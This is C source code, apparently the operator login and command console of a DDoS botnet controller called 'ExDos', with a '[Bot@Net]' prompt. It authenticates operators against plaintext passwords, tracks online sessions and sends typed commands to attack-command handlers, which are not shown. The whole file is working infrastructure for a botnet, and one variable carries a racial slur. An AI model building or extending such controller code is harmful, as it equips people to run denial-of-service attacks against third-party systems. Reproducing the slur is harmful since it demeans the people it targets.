#include <stdio.h>
#include <string.h>
#include <stdlib.h>

#include "../headers/db/users.h"
#include "../headers/__init__.h"

void AuthenticateUser(void **args) {
    ExDos *c        = (ExDos *)args[0];
    Socket *client  = (Socket *)args[1];

    GetClientIP(client);

    int chk_event = c->cogs->FindEvent(c->cogs, NEW_CONNECTION_EVENT);
    if(chk_event >= 0) {
        c->cogs->GetEvent(c->cogs, chk_event)->fn((ExDos *)c, (Socket *)client);
    }

    // 7 Tries // If info is incorrect on a user, it'd disconnect
    for(int i = 0; i < 7; i++) {
        str *uprompt = string("Username: ");
        Write(client, uprompt);
        str *username = Read(client);
        if(!username) {
            free(uprompt);
            Close(client);
            return;
        }
        
        username->ReplaceChar(username, '\r', ' ');
        username->ReplaceChar(username, '\n', ' ');
        username->Strip(username);

        str *pprompt = string("Password: ");
        Write(client, pprompt);
        str *passwd = Read(client);
        if(!passwd) {
            free(uprompt);
            free(pprompt);
            free(username);
            Close(client);
            return;
        }

        passwd->ReplaceChar(passwd, '\r', ' ');
        passwd->ReplaceChar(passwd, '\n', ' ');
        passwd->Strip(passwd);

        User *user = FindUser(c, username);
        if(!user) {
            str *invalid_u = string("[ x ] An error has occupied during login....!\n");
            Write(client, invalid_u);
            close(client->SockFD);
            free(uprompt);
            free(pprompt);
            free(invalid_u);
            free(username);
            free(passwd);
            return;
        }

        if(strlen(passwd->data) < 2) {
            free(uprompt);
            free(pprompt);
            free(username);
            free(passwd);
            continue;
        }
        
        if(!strcmp(username->data, user->USERNAME->data) && !strcmp(passwd->data, user->PASSWD->data)) {
            /* Add User To Session List && Set Socket To Blocking Mode */
            c->online_users[c->online_user_count] = new_client(username, user, client);
            c->online_user_count++;
            c->online_users = (void **)realloc(c->online_users, sizeof(void *) * (c->online_user_count + 1));
            set_socket_timeout(client, 0);

            /* SUCCESSFUL_LOGIN_EVENT */
            chk_event = c->cogs->FindEvent(c->cogs, SUCCESSFUL_LOGIN_EVENT);
            if(chk_event >= 0)
                c->cogs->GetEvent(c->cogs, chk_event)->fn(c, c->online_users[c->online_user_count - 1]);

            /* Prompt To CLI */
            UserCLI(c, client, c->online_users[c->online_user_count - 1]);
            free(uprompt);
            free(pprompt);
            return;
        }

        free(username);
        free(passwd);
        free(uprompt);
        free(pprompt);
    }

    Write(client, string("[ x ] Max Login Attempt Reached"));
    close(client->SockFD);
}

Client *new_client(str *username, User *acc, Socket *sock) {
    Client *u = (Client *)malloc(sizeof(Client));
    u->Username = string(username->data);
    u->account = acc;
    u->sock = sock;

    return u;
}

void UserCLI(void *c, Socket *client, Client *u) {
    /* Command Handler */
    str *cmd_input      = string(NULL);
    str *nig            = string(NULL);
    Arr *Args           = Array(NULL);
    while(1) {
        place_text(client, string("27"), string("3"), string("[Bot@Net] # ~ "));

        cmd_input = Read(client);
        if(!cmd_input) {
            close(client->SockFD);
            free(cmd_input);
            free(nig);
            free(Args);
            return;
        }

        cmd_input->ReplaceChar(cmd_input, '\r', ' ');
        cmd_input->ReplaceChar(cmd_input, '\n', ' ');
        cmd_input->Strip(cmd_input);

        if(strstr(cmd_input->data, " ")) {
            str *n = string(cmd_input->data);
            char **args = cmd_input->Split(n, " ");
            args[count_arr(args)] = NULL;
            Args = Array(args);
            free(n);
            free(args);
        }
        
        str *query = cmd_input;
        if(strstr(cmd_input->data, " "))
            query = string(Args->arr[0]);

        int chk = ((ExDos *)c)->cogs->FindCmd(((ExDos *)c)->cogs, query);
        if(chk >= 0) {
            Command *cmd = ((ExDos *)c)->cogs->GetCmd(((ExDos *)c)->cogs, chk);
            cmd->fn((ExDos *)c, u, cmd_input, Args);
            
            chk = ((ExDos *)c)->cogs->FindEvent(((ExDos *)c)->cogs, VALID_CMD_EVENT);
            if(chk >= 0)
                ((ExDos *)c)->cogs->GetEvent(((ExDos *)c)->cogs, chk)->fn((ExDos *)c, u, cmd_input, Args);
        } else {
            chk = ((ExDos *)c)->cogs->FindEvent(((ExDos *)c)->cogs, INVALID_CMD_EVENT);
            if(chk >= 0) {
                ((ExDos *)c)->cogs->GetEvent(((ExDos *)c)->cogs, chk)->fn((ExDos *)c, u, cmd_input, Args);
            } else {
                str *buf = string("[ x ] Error, Invalid command...!\n");
                Write(client, buf);
                free(buf);
            }
        }

        free(Args);
        free(cmd_input);

        cmd_input = string(NULL);
        Args = Array(NULL);
    }
}